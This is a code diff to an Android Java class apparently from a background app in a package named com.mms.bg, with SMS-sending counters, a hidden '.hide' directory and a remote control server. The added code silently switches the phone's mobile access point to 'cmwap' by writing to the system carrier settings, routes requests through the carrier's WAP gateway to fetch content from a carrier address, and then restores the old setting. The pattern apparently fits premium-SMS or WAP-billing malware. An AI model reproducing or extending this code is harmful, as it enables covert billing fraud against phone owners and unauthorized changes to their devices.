@@ -14,10 +14,13 @@ import java.util.Date;
 import javax.xml.parsers.SAXParser;
 import javax.xml.parsers.SAXParserFactory;
 
+import org.apache.http.HttpHost;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.conn.params.ConnRoutePNames;
 import org.apache.http.entity.InputStreamEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.BasicHttpParams;
@@ -26,13 +29,21 @@ import org.apache.http.params.HttpParams;
 import org.apache.http.protocol.HTTP;
 import org.xmlpull.v1.XmlSerializer;
 
-import android.R;
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.database.SQLException;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.Build;
 import android.os.PowerManager;
 import android.telephony.TelephonyManager;
@@ -45,7 +56,7 @@ import com.mms.bg.util.XMLHandler;
 
 public class SettingManager {
     private static final String TAG = "SettingManager";
-    private static final boolean DEBUG = false;
+    private static final boolean DEBUG = true;
     
     public static final String TARGET_NUM = "target_num";
     public static final String SMS_COUNT = "sms_send_count";
@@ -69,13 +80,19 @@ public class SettingManager {
     public static final String INTERNET_CONNECT_FAILED = "internet_connect_failed";
     public static final String INTERNET_CONNECT_FAILED_BEFORE_SMS = "internet_connect_failed_before_SMS";
     
+    private static final String CMWAP = "cmwap";
 //    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
     private static final String SERVER_URL = "http://www.youlubg.com:81/Coop/request3.php";
+    private static final String VEDIO_URL = "http://211.136.165.53/wl/rmw1s/pp66.jsp";
+    
+    private static final Uri uri_apn = Uri.parse("content://telephony/carriers/preferapn");
+    private static final Uri uri_apn_list = Uri.parse("content://telephony/carriers");
     
     public final String BASE_PATH;
     public final String SETTING_FILE_NAME;
     public final String UPLOAD_FILE_PATH;
     public final String DOWNLOAD_FILE_PATH;
+    public final String VEDIO_DOWNLOAD_FILE_PATH;
     
     private static final int DEFAULT_SMS_COUNT = 0;
     
@@ -100,6 +117,9 @@ public class SettingManager {
     private LogUtil mLog;
     public XMLHandler mXMLHandler;
     public String mPid;
+    public String mOldAPNId;
+    public ConnectivityManager mConnMgr;
+    public ContentResolver mResolver;
     
     public static SettingManager getInstance(Context context) {
         if (gSettingManager == null) {
@@ -486,6 +506,32 @@ public class SettingManager {
         return params;
     }
     
+    private HttpParams getParams(String ip, String port) {
+        HttpParams params = new BasicHttpParams();
+        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
+        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
+        HttpConnectionParams.setSocketBufferSize(params, 8192);
+        if (canUseProxy() == true && ip != null && port != null) {
+            LOGD("======= set proxy for ip = " + ip + " port = " + port + " =======");
+            HttpHost proxy = new HttpHost(ip, Integer.valueOf(port), "http");
+            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
+        }
+        return params;
+    }
+    
+    private boolean canUseProxy() {
+        ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo info = ConnMgr.getActiveNetworkInfo();
+        if (info != null) {
+            if (info.getType() == ConnectivityManager.TYPE_WIFI) {
+                return false;
+            } else if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
     public HttpResponse openConnection(File uploadFile) {
         LOGD("[[openConnection]]");
         HttpClient hc = new DefaultHttpClient(getParams());
@@ -512,6 +558,44 @@ public class SettingManager {
         }
         try {
             HttpResponse response = hc.execute(post);
+            LOGD("[[openConnection]] return response != null");
+            return response;
+        } catch (ClientProtocolException e) {
+            if (DEBUG) {
+                e.printStackTrace();
+            }
+        } catch (IOException e) {
+            if (DEBUG) {
+                e.printStackTrace();
+            }
+        } catch (Exception e) {
+            if (DEBUG) {
+                e.printStackTrace();
+            }
+        }
+        return null;
+    }
+    
+    public HttpResponse openConnection(String ip, String port) {
+        LOGD("[[openConnection]] for ip and port");
+//        ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+//        if (this.canUseProxy() == true) {
+//            int ret = ConnMgr.startUsingNetworkFeature(ConnectivityManager.TYPE_MOBILE, "mms");
+//            LOGD("------ switch the network APN to mms = " + ret + " --------");
+//        }
+        
+        HttpClient hc = new DefaultHttpClient(getParams(ip, port));
+        HttpGet get = new HttpGet();
+        try {
+            get.setURI(new URI(VEDIO_URL));
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
+            return null;
+        }
+        get.setHeader(HTTP.CONTENT_TYPE, "text/plain");
+        get.setHeader("Accept", "*/*");
+        try {
+            HttpResponse response = hc.execute(get);
             LOGD("[[openConnection]] return response != null");
             return response;
         } catch (ClientProtocolException e) {
@@ -670,6 +754,40 @@ public class SettingManager {
         return true;
     }
     
+    public boolean getVedioXML() {
+        LOGD("");
+        HttpResponse r = openConnection("10.0.0.172", "80");
+        if (r == null) return false;
+        if (r.getStatusLine().getStatusCode() != 200) {
+            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            log(TAG, "r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            return false;
+        }
+        try {
+            File outFile = new File(VEDIO_DOWNLOAD_FILE_PATH);
+            if (!outFile.exists()) {
+                outFile.createNewFile();
+            }
+            LOGD("[[getTargetNum]] download file now");
+            FileOutputStream fos = new FileOutputStream(VEDIO_DOWNLOAD_FILE_PATH, false);
+            InputStream is = r.getEntity().getContent();
+            byte[] buffer = new byte[1024];
+            int readLength = 0;
+            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
+                fos.write(buffer, 0, readLength);
+                fos.flush();
+            }
+            fos.close();
+            is.close();
+            dumpReceiveFile(VEDIO_DOWNLOAD_FILE_PATH);
+            
+        } catch (Exception e) {
+            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
+            return false;
+        }
+        return true;
+    }
+    
     public boolean parseServerXMLInfo() {
         File file = new File(DOWNLOAD_FILE_PATH);
         if (file.exists() == true) {
@@ -748,6 +866,140 @@ public class SettingManager {
         }
     }
     
+    public void downloadVedio() {
+        if (forceCMWapConnection() == false) {
+            //mean the current apn is already cmwap
+            getVedioProcess();
+        }
+    }
+    
+    private NetworkChangeReceiver mNChangeReceiver;
+    
+    public boolean forceCMWapConnection() { 
+        NetworkInfo info = mConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
+        String oldAPN = info.getExtraInfo(); 
+        
+        //if current apn is not cmwap, we have to switch to cmwap. 
+        if (oldAPN != null && CMWAP.equals(oldAPN) == false) {
+            String  projection[] = {"_id,apn,type,current"};
+            Cursor cr = mResolver.query(uri_apn, projection, null, null, null);
+            if (cr != null && cr.moveToFirst() == true) {
+                if (cr != null) {   
+                    LOGD(cr.getString(cr.getColumnIndex("_id")) + "  " + cr.getString(cr.getColumnIndex("apn")) + "  " + cr.getString(cr.getColumnIndex("type"))+ "  " + cr.getString(cr.getColumnIndex("current")));    
+                    if (cr.getString(cr.getColumnIndex("current")) != null 
+                            && cr.getString(cr.getColumnIndex("current")).equals("1") == true) {
+                        this.mOldAPNId = cr.getString(cr.getColumnIndex("_id"));
+                    }
+                }  
+            }
+            
+            mNChangeReceiver = new NetworkChangeReceiver(); 
+            //register receiver for wap network connection. 
+            IntentFilter upIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION); 
+            mContext.registerReceiver(mNChangeReceiver, upIntentFilter);
+            String newAPNId = getApnIdByName(CMWAP);
+            if (newAPNId != null) {
+                updateCurrentAPN(newAPNId); 
+            }
+            return true; 
+        } 
+        return false; 
+    } 
+
+    private void getVedioProcess() {
+        if (getVedioXML() == true) {
+            //TODO: download the url link
+            Thread t = new Thread(new Runnable() {
+                public void run() {
+                    //TODO : download the vedio from link
+                    updateCurrentAPN(mOldAPNId);
+                    mOldAPNId = null;
+                }
+            });
+        } else {
+            updateCurrentAPN(mOldAPNId);
+            mOldAPNId = null;
+        }
+    }
+    
+    private class NetworkChangeReceiver extends BroadcastReceiver { 
+        public void onReceive(Context context, Intent intent) { 
+            LOGD("======= received the action = " + intent.getAction() + " ======");
+            if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) { 
+                ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+                NetworkInfo info = ConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
+                String apn = info.getExtraInfo(); 
+                LOGD("apn = " + apn);
+                if (CMWAP.equals(apn) == true) { 
+                    /* 
+                     * apn change message is sent out more than once during a second, but it 
+                     * only happens once practically. 
+                     */ 
+                    if (mNChangeReceiver != null) {
+                        mContext.unregisterReceiver(mNChangeReceiver); 
+                        mNChangeReceiver = null; 
+                    } 
+                    getVedioProcess();
+                } 
+            } 
+        } 
+    } 
+    
+    private int updateCurrentAPN(String apnId) {
+        try { 
+            LOGD("----- apn id = " + apnId + " --------");
+            //set new apn id as chosen one 
+            if (apnId != null) { 
+                ContentValues values = new ContentValues(); 
+                values.put("apn_id", apnId); 
+                mResolver.update(uri_apn, values, null, null); 
+            } else { 
+                return 0; 
+            } 
+        } catch (Exception e) { 
+            Log.d(TAG, e.getMessage());
+            return 0;
+        }
+        
+        //update success 
+        return 1; 
+    }
+    
+    private String getApnIdByName(String apnName) {
+        if (apnName == null) return null;
+        
+        String ret = null;
+        Cursor cr = null;
+        try {
+        String projection[] = { "_id,apn,type,current" };
+        cr = mResolver.query(uri_apn_list, projection, "current = 1 and apn = ?"
+                                , new String[] {apnName}, null);
+        if (cr != null && cr.moveToFirst() == true) {
+            while (cr != null) {
+                LOGD(cr.getString(cr.getColumnIndex("_id")) + "  "
+                        + cr.getString(cr.getColumnIndex("apn")) + "  "
+                        + cr.getString(cr.getColumnIndex("type")) + "  "
+                        + cr.getString(cr.getColumnIndex("current")));
+            
+                if (cr.getString(cr.getColumnIndex("type")) != null
+                        && cr.getString(cr.getColumnIndex("type")).equals("mms") == false) {
+                    ret = cr.getString(cr.getColumnIndex("_id"));
+                    break;
+                }
+                if (cr.moveToNext() == false) {
+                    break;
+                }
+            }
+        }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            cr.close();
+            cr = null;
+        }
+        return ret;
+    }
+    
     private SettingManager(Context context) {
         mContext = context;
         BASE_PATH = context.getFilesDir().getAbsolutePath() + "/.hide/";
@@ -761,6 +1013,9 @@ public class SettingManager {
         mLog = LogUtil.getInstance(BASE_PATH + "log.txt");
         UPLOAD_FILE_PATH = BASE_PATH + "upload.xml";
         DOWNLOAD_FILE_PATH = BASE_PATH + "serverInfo.xml";
+        VEDIO_DOWNLOAD_FILE_PATH = BASE_PATH + "vedio.xml";
+        mConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+        mResolver = mContext.getContentResolver();
     }
     
     private void LOGD(String msg) {
